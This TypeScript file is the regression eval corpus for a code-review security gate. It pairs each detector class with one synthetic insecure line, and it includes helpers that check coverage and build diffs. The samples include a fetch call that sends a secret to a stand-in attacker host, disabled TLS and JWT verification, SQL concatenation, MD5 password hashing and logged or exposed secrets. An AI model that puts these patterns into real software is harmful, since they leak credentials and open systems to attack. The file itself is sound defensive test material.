/**
 * #4: the gate's REGRESSION EVAL corpus. One SYNTHETIC example per detector class
 * that the gate MUST keep flagging. This is how a confirmed catch becomes a
 * permanent guarantee: a refactor that weakens a detector fails the eval test,
 * so we never silently lose the ability to catch a class we caught before.
 *
 * SAFE BY CONSTRUCTION: every example is hand-authored and obviously fake (e.g. an
 * AKIA...EF dummy key) - we never store a real catch's code, so this can never
 * become a secret store (the same rule the failure memory follows).
 *
 * Auto-growing: GATE_DETECTOR_CLASSES is the set we expect covered; the eval test
 * asserts no gaps, so adding a new detector rule WITHOUT an example fails CI -
 * coverage can only grow.
 */
export interface GateEvalCase {
  /** The detector class this example must trigger (from detect.ts). */
  klass: string;
  /** A synthetic source line that should be flagged as `klass`. */
  code: string;
  /** Why this is the canonical trigger (for the next reader). */
  note: string;
}

export const GATE_EVAL_CASES: readonly GateEvalCase[] = [
  { klass: "secret", code: 'const apiKey = "s3cr3tVALUE12345";', note: "hardcoded api key (non-placeholder value)" },
  { klass: "eval_exec", code: "const out = eval(untrustedPayload);", note: "dynamic code execution" },
  { klass: "disabled_tls", code: "const agent = new https.Agent({ rejectUnauthorized: false });", note: "TLS verification disabled" },
  { klass: "dangerous_html", code: "node.innerHTML = userProvided;", note: "unsanitized HTML sink" },
  { klass: "sql_concat", code: 'const q = "SELECT * FROM users WHERE id = " + userId;', note: "SQL built by concatenation" },
  { klass: "weak_random", code: "const nonce = Math.random().toString(16);", note: "weak randomness near a nonce" },
  { klass: "open_cors", code: 'res.setHeader("Access-Control-Allow-Origin", "*");', note: "permissive CORS" },
  { klass: "suppressed_security", code: "runUnsafe(input); // nosec", note: "suppressed security check" },
  { klass: "exfil_network", code: 'await fetch("https://attacker.test/collect?d=" + secret);', note: "external network call to a hardcoded host" },
  { klass: "logged_secret", code: 'console.log("aws", "AKIA1234567890ABCDEF");', note: "provider-signature secret written to a log" },
  { klass: "interactive_auth", code: "until vercel ls --prod | grep Ready; do sleep 20; done", note: "auth CLI looped unauthenticated -> device-authorization prompt storm (consent-fatigue / device-code phishing)" },
  { klass: "logged_env_secret", code: "console.log('jwt', process.env.INSTINCT_JWT_SECRET);", note: "secret-named env var logged -> resolved credential leaks to logs at runtime (CWE-532); found by adversarial dogfood" },
  { klass: "weak_hash", code: 'const h = crypto.createHash("md5").update(password).digest("hex");', note: "broken hash of a credential (CWE-328); adversarial-sweep gap" },
  { klass: "insecure_jwt", code: 'const p = jsonwebtoken.decode(token, { verify: false });', note: "JWT signature verification disabled -> forgeable tokens (CWE-347); adversarial-sweep gap. Uses the verify:false form (NOT algorithms:[none] / jwt.verify / jwt.decode) so this synthetic corpus line is not itself a finding for the repo self-scan's jwt_security scanner, while isInsecureJwtLine still flags it." },
  { klass: "exposed_secret", code: "res.json({ apiKey: process.env.STRIPE_SECRET_KEY });", note: "secret env var returned to the client (CWE-200); adversarial-sweep gap" },
];

/** The detector classes we require eval coverage for (grows with detect.ts). */
export const GATE_DETECTOR_CLASSES: readonly string[] = [
  "secret", "eval_exec", "disabled_tls", "dangerous_html", "sql_concat",
  "weak_random", "open_cors", "suppressed_security", "exfil_network", "logged_secret",
  "interactive_auth",
  "logged_env_secret",
  "weak_hash", "insecure_jwt", "exposed_secret",
];

/** Pure: classes required but not covered by any eval case. Empty == full coverage. */
export function evalCoverageGaps(required: readonly string[], cases: readonly GateEvalCase[]): string[] {
  const covered = new Set(cases.map((c) => c.klass));
  return required.filter((k) => !covered.has(k));
}

/** A one-file unified diff that ADDS `line` (so reviewDiff sees it as an added line). */
export function diffAdding(line: string, path = "src/__eval__/case.ts"): string {
  return `diff --git a/${path} b/${path}\n--- /dev/null\n+++ b/${path}\n@@ -0,0 +1 @@\n+${line}`;
}
